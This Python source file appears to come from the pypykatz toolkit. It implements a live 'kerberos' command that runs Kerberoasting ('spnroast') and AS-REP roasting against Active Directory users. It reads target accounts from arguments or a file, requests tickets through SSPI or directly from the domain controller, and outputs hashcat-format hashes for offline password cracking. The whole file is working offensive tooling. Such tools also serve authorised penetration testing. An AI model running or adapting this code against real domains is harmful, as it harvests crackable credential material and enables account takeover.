#!/usr/bin/env python3
#
# Author:
#  Tamas Jos (@skelsec)
#

from pypykatz import logging

"""
Kerberos is not part of pypykatz directly. 
This is a wrapper for minikerberos and winsspi packages
"""

class KerberosCMDHelper:
	def __init__(self):
		self.live_keywords = ['kerberos']
		self.keywords = []
		
	def add_args(self, parser, live_parser):
		live_group = live_parser.add_parser('kerberos', help='Kerberos (live) related commands')
		live_group.add_argument('-c','--credential', help= 'Credential to be used, if omitted it will use teh credentials of the current user. If specified, it will try to impersonate the user. (requires the the target user has a session on the local computer)')
		live_group.add_argument('--dc-ip', help= 'IP address or hostname of the LDAP server. Optional. If omitted will use registry to check for the DC.')
		live_group.add_argument('cmd', choices=['spnroast', 'asreproast'])
		live_group.add_argument('-o','--out-file', help= 'File to stroe results in')
		live_group.add_argument('-t','--target-file', help= 'List of target users to roast. One user per line. Format: asreproast->username spnroast->domain/username')
		live_group.add_argument('-u','--target-user', action='append', help='Target users to roast in <realm>/<username> format or just the <username>, if -r is specified. Can be stacked.')
		live_group.add_argument('-r','--realm', help= 'Kerberos Realm.')
		
		
	def execute(self, args):
		if len(self.keywords) > 0 and args.command in self.keywords:
			self.run(args)
		
		if len(self.live_keywords) > 0 and args.command == 'live' and args.module in self.live_keywords:
			self.run_live(args)
			
			
	def run_live(self, args):
		from winsspi.sspi import KerberoastSSPI
		from minikerberos.security import TGSTicket2hashcat, APREPRoast
		from minikerberos.utils import TGTTicket2hashcat
		from minikerberos.communication import KerberosSocket
		from minikerberos.common import KerberosTarget
		from pypykatz.commons.winapi.machine import LiveMachine
		
		if not args.target_file and not args.target_user:
			raise Exception('No targets loaded! Either -u or -t MUST be specified!')
		
		machine = LiveMachine()
		
		realm = args.realm
		if not args.realm:
			realm = machine.get_domain()
		
		if args.cmd in ['spnroast','asreproast']:
			targets = []
			if args.target_file:
				with open(args.target_file, 'r') as f:
					for line in f:
						line = line.strip()
						domain = None
						username = None
						if line.find('/') != -1:
							#we take for granted that usernames do not have the char / in them!
							domain, username = line.split('/')
						else:
							username = line

						if args.realm:
							domain = args.realm
						else:
							if domain is None:
								raise Exception('Realm is missing. Either use the -r parameter or store the target users in <realm>/<username> format in the targets file')
						
						target = KerberosTarget()
						target.username = username
						target.domain = domain
						targets.append(target)
						
			if args.target_user:
				for user in args.target_user:
					domain = None
					username = None
					if user.find('/') != -1:
						#we take for granted that usernames do not have the char / in them!
						domain, username = user.split('/')
					else:
						username = user

					if args.realm:
						domain = args.realm
					else:
						if domain is None:
							raise Exception('Realm is missing. Either use the -r parameter or store the target users in <realm>/<username> format in the targets file')
					target = KerberosTarget()
					target.username = username
					target.domain = domain
					targets.append(target)
			
			results = []
			errors = []
			if args.cmd  == 'spnroast':
				for spn_name in targets:
					ksspi = KerberoastSSPI()
					try:
						ticket = ksspi.get_ticket_for_spn(spn_name.get_formatted_pname())
					except Exception as e:
						errors.append((spn_name, e))
						continue
					results.append(TGSTicket2hashcat(ticket))
				
			elif args.cmd == 'asreproast':
				dcip = args.dc_ip
				if args.dc_ip is None:
					dcip = machine.get_domain()
				ks = KerberosSocket( dcip )
				ar = APREPRoast(ks)
				results = ar.run(targets)

				
			if args.out_file:
				with open(args.out_file, 'w') as f:
					for thash in results:
						f.write(thash + '\r\n')

			else:
				for thash in results:
					print(thash)
			
			for err in errors:
				print('Failed to get ticket for %s. Reason: %s' % (err[0], err[1]))

			logging.info('SSPI based Kerberoast complete')
		
	def run(self, args):
		raise NotImplementedError('Platform independent kerberos not implemented!')